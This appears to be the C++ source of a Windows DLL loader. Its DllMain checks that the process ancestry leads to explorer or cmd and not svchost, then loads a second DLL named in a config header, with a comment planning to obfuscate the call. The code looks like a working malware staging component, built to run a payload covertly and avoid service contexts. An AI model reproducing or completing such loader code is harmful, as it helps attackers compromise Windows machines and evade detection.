#define LOADER

#include <windows.h>
#include <string>
#include <tlhelp32.h>
#include <psapi.h>
#include "config.h"

DWORD GetPPID(DWORD pid)
{
    HANDLE h = NULL;
    PROCESSENTRY32 pe = { 0 };
    DWORD ppid = 0;
    pe.dwSize = sizeof(PROCESSENTRY32);
    h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(h, &pe))
    {
        do
        {
            if (pe.th32ProcessID == pid)
            {
                ppid = pe.th32ParentProcessID;
                break;
            }
        } while (Process32Next(h, &pe));
    }
    CloseHandle(h);
    return (ppid);
}

int GetProcessName(DWORD pid, char* fname, DWORD sz)
{
    HANDLE hProcess = NULL;
    int errorCode = 0;
    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProcess)
    {
        GetProcessImageFileName(hProcess, fname, sz);
        CloseHandle(hProcess);
    }
    else
    {
        errorCode = GetLastError();
    }
    return errorCode;
}

bool IsExplorerProcess(void)
{
    DWORD pid;
    char fname[MAX_PATH] = { 0 };
    pid = GetCurrentProcessId();
    std::string processName;

    do
    {
        if (pid == 0)
            return false;

        if (!GetProcessName(pid, fname, MAX_PATH))
        {
            processName = std::string(fname);
            if (processName.find("svchost") != std::string::npos) // efficiency is key here
                return false;

            pid = GetPPID(pid);
        }
        else
        {
            return false;
        }
    } while (processName.find("explorer") == std::string::npos && processName.find("cmd") == std::string::npos);

    return true;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        if (!IsExplorerProcess())
            return FALSE;
        
        LoadLibraryW(DLL); // TODO obfuscate
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
